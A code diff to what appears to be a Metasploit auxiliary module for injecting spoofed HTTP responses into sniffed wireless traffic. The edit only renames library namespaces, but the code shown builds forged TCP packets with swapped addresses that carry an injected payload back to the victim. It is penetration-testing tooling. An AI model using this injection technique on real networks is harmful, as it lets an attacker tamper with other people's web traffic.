@@ -140,13 +140,13 @@ class Metasploit3 < Msf::Auxiliary
 
 			next if not d3
 
-			eth = Racket::Ethernet.new(d3)
+			eth = Racket::L2::Ethernet.new(d3)
 			next if eth.ethertype != 0x0800
 
-			ip = Racket::IPv4.new(eth.payload)
+			ip = Racket::L3::IPv4.new(eth.payload)
 			next if ip.protocol != 6
 
-			tcp = Racket::TCP.new(ip.payload)
+			tcp = Racket::L4::TCP.new(ip.payload)
 
 			@http.each do |r|
 				hit = nil
@@ -162,18 +162,18 @@ class Metasploit3 < Msf::Auxiliary
 				injpkt.bssid = pkt.bssid
 
 				response = Racket::Racket.new
-				response.l2 = Racket::Ethernet.new("01234567890123")
+				response.l2 = Racket::L2::Ethernet.new("01234567890123")
 				response.l2.dst_mac = eth.src_mac
 				response.l2.src_mac = eth.dst_mac
 				response.l2.ethertype = 0x0800
 
-				response.l3 = Racket::IPv4.new
+				response.l3 = Racket::L3::IPv4.new
 				response.l3.src_ip = ip.dst_ip
 				response.l3.dst_ip = ip.src_ip
 				response.l3.protocol = ip.protocol
 				response.l3.ttl = ip.ttl
 
-				response.l4 = Racket::TCP.new
+				response.l4 = Racket::L4::TCP.new
 				response.l4.src_port = tcp.dst_port
 				response.l4.dst_port = tcp.src_port
 				response.l4.window = tcp.window
@@ -184,7 +184,7 @@ class Metasploit3 < Msf::Auxiliary
 				response.l4.flag_ack = 1
 				response.l4.flag_psh = 1
 
-				response.l5 = Racket::RawL5.new
+				response.l5 = Racket::L5::RawL5.new
 				response.l5.payload = r["txresponse"]
 
 				response.l4.fix!(response.l3.src_ip, response.l3.dst_ip, '')
